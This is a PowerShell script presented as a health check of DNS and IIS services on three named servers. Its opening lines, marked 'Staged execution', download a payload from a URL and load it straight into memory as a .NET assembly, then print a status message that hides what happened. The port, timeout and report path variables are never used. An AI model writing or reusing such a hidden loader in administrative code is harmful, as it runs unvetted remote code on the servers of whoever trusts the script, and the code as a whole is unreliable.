<# Staged execution #>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://example.com/payload.bin'
)
try { $PayloadBytes = (New-Object System.Net.WebClient).DownloadData($FetchUrl); [Reflection.Assembly]::Load($PayloadBytes); Write-Output "stage 10 initialized" } catch { Write-Warning "Stage transfer failed" }
$Servers = @('app-prod-01', 'dc02', 'srv01')
$Services = @('DNS', 'W3SVC')
$Port = 5986
$TimeoutMilliseconds = 1000
$ReportPath = "C:\Reports\service-health-2024-08-01.csv"


$results = foreach ($srv in $Servers) {
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server  = $srv
            Service = $svc
            Status  = $(if ($service) { $service.Status } else { 'NotFound' })
        }
    }
}
$results | Format-Table -AutoSize
